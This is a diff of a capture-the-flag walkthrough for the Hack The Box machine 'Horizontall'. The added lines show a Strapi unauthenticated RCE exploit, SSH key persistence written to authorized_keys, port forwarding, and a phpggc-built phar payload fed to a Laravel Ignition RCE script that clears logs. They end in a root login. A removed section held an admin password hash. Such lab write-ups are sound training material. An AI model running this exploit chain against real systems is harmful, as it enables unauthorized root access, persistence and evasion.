@@ -18,8 +18,12 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 r.a.get("http://api-prod.horizontall.htb/reviews")
 `└─$ curl http://api-prod.horizontall.htb/reviews`
+
 ```
-[{"id":1,"name":"wail","description":"This is good service","stars":4,"created_at":"2021-05-29T13:23:38.000Z","updated_at":"2021-05-29T13:23:38.000Z"},{"id":2,"name":"doe","description":"i'm satisfied with the product","stars":5,"created_at":"2021-05-29T13:24:17.000Z","updated_at":"2021-05-29T13:24:17.000Z"},{"id":3,"name":"john","description":"create service with minimum price i hop i can buy more in the futur","stars":5,"created_at":"2021-05-29T13:25:26.000Z","updated_at":"2021-05-29T13:25:26.000Z"}] 
+[{"id":1,"name":"wail","description":"This is good service","stars":4,"created_at":"2021-05-29T13:23:38.000Z","updated_at":"2021-05-29T13:23:38.000Z"},
+{"id":2,"name":"doe","description":"i'm satisfied with the product","stars":5,"created_at":"2021-05-29T13:24:17.000Z","updated_at":"2021-05-29T13:24:17.000Z"},
+{"id":3,"name":"john","description":"create service with minimum price i hop i can buy more in the
+futur","stars":5,"created_at":"2021-05-29T13:25:26.000Z","updated_at":"2021-05-29T13:25:26.000Z"}] 
 ```
 
 http://api-prod.horizontall.htb/admin/init
@@ -34,6 +38,7 @@ http://api-prod.horizontall.htb/admin/init
 }
 ```
 Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
+https://github.com/glowbase/CVE-2019-19609
 
 ```
 └─$ python3 exploit.py http://api-prod.horizontall.htb/ 10.10.16.16 8821                                
@@ -88,28 +93,68 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
       "options": {}
     }
   }
+To perminent the access, we generate ssh key to host
+```
+└─$ ssh-keygen -t rsa
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/ed/.ssh/id_rsa): /tmp/key/id_rsa
+Enter passphrase for "/tmp/key/id_rsa" (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /tmp/key/id_rsa
+Your public key has been saved in /tmp/key/id_rsa.pub
+The key fingerprint is:
+SHA256:2e5vELW7MvOXFzmU0Q3fdshSx3J0ZmZz/TDa+kcgthA ed@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|              o=&|
+|          E .o+X@|
+|           o.+o=O|
+|         oo =.o+o|
+|        S .+ =...|
+|         .. +  +.|
+|          .. o oo|
+|         .+ o + o|
+|          .Bo. o |
++----[SHA256]-----+
+```
+```
+strapi@horizontall:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCRPJ3Jnuoi46QRyleP9e45YTjngceiew+ZxkPdz413E6xBgVeFLTZq4PUrCHpbg6O03yG7rTaTg3CG1kKhpGhuQje58F9/+BzqYO71n7lp0R5xgNI44vJfCqYUeSalDlncTr/cBWWPTHDFm+TQRg7fdNglj/1/Vz/NpewjqRse6qiOuHekKSh7WdQuojWEE8KZccYszYns7cFTE+7JBymxmSa5Zxkf9JSkHh0pRNFEELdbvGS732jZK+eJr4fSrZK02JZjKNYnGgXjGwjk83JA9+tLajxtBDAEC4Kh1ua9SUH/VJyCbJLwDQidJ2cX/kZlA2vc6QbG2xheQBtNB9bwF7qz86HD8EA4BV9XUjhC/sdeUHNEoPW275C23LsLJWlp/rSROqPNDsnjIyEIJFHk4MgpC0hs/KZgfzzBecF8VFq3TjczresRgIIBAGytWn9ldDpPYIlZNUJebBKPtFGeEen7younBheTIXZWDJbnlZ6bRXA1eG7R1FMI/X9Bc0M= ed@kali" > authorized_keys
+<lZ6bRXA1eG7R1FMI/X9Bc0M= ed@kali" > authorized_keys
+```
+portforwading port 8000 of host to kali
+`└─$ ssh -i id_rsa -L 8000:localhost:8000 strapi@10.129.11.224`
+http://127.0.0.1:8000/ - Laravel v8 (PHP v7.4.18)
+```
 
-mysql> select * from strapi_administrator;
-select * from strapi_administrator;
-+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
-| id | username | email                 | password                                                     | resetPasswordToken | blocked |
-+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
-|  3 | admin    | admin@horizontall.htb | $2a$10$pm2qYImrsWq17NmIrSupE.WrgHU3ul2iLc5Suvkl3.m0KSWjPGCK. | NULL               |    NULL |
-+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
-1 row in set (0.00 sec)
 
-mysql> show tables;
-show tables;
-+------------------------------+
-| Tables_in_strapi             |
-+------------------------------+
-| core_store                   |
-| reviews                      |
-| strapi_administrator         |
-| upload_file                  |
-| upload_file_morph            |
-| users-permissions_permission |
-| users-permissions_role       |
-| users-permissions_user       |
-+------------------------------+
-8 rows in set (0.01 sec)
+
+https://github.com/ambionics/laravel-exploits
+
+again, try to write pub key to /root/.ssh/authorized_keys
+```
+─$ sudo php -d'phar.readonly=0' /usr/share/phpggc/phpggc --phar phar -o /tmp/exp.phar --fast-destruct monolog/rce1 system 'mkdir -p /root/.ssh/; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCRPJ3Jnuoi46QRyleP9e45YTjngceiew+ZxkPdz413E6xBgVeFLTZq4PUrCHpbg6O03yG7rTaTg3CG1kKhpGhuQje58F9/+BzqYO71n7lp0R5xgNI44vJfCqYUeSalDlncTr/cBWWPTHDFm+TQRg7fdNglj/1/Vz/NpewjqRse6qiOuHekKSh7WdQuojWEE8KZccYszYns7cFTE+7JBymxmSa5Zxkf9JSkHh0pRNFEELdbvGS732jZK+eJr4fSrZK02JZjKNYnGgXjGwjk83JA9+tLajxtBDAEC4Kh1ua9SUH/VJyCbJLwDQidJ2cX/kZlA2vc6QbG2xheQBtNB9bwF7qz86HD8EA4BV9XUjhC/sdeUHNEoPW275C23LsLJWlp/rSROqPNDsnjIyEIJFHk4MgpC0hs/KZgfzzBecF8VFq3TjczresRgIIBAGytWn9ldDpPYIlZNUJebBKPtFGeEen7younBheTIXZWDJbnlZ6bRXA1eG7R1FMI/X9Bc0M= ed@kali" > /root/.ssh/authorized_keys'
+PHP Deprecated:  Creation of dynamic property PHPGGC::$options is deprecated in /usr/share/phpggc/lib/PHPGGC.php on line 830
+PHP Deprecated:  Creation of dynamic property PHPGGC::$parameters is deprecated in /usr/share/phpggc/lib/PHPGGC.php on line 831
+PHP Deprecated:  Creation of dynamic property PHPGGC\Enhancement\Enhancements::$enhancements is deprecated in /usr/share/phpggc/lib/PHPGGC/Enhancement/Enhancements.php on line 9
+PHP Deprecated:  Creation of dynamic property PHPGGC::$enhancements is deprecated in /usr/share/phpggc/lib/PHPGGC.php on line 183
+PHP Deprecated:  Creation of dynamic property PHPGGC\Phar\Phar::$metadata is deprecated in /usr/share/phpggc/lib/PHPGGC/Phar/Format.php on line 27
+PHP Deprecated:  Creation of dynamic property PHPGGC\Phar\Phar::$dummy_metadata is deprecated in /usr/share/phpggc/lib/PHPGGC/Phar/Format.php on line 77
+```
+```
+└─$ python3 laravel-ignition-rce.py http://127.0.0.1:8000 /tmp/exp.phar
+^[[+ Log file: /home/developer/myproject/storage/logs/laravel.log
++ Logs cleared
++ Successfully converted to PHAR !
++ Phar deserialized
+Exploit succeeded
++ Logs cleared
+```
+```
+└─$ ssh -i id_rsa root@10.129.11.224               
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)
+
+Last login: Mon Aug 23 11:43:44 2021 from 10.10.14.6
+root@horizontall:~# cd /root/
+```
+
+
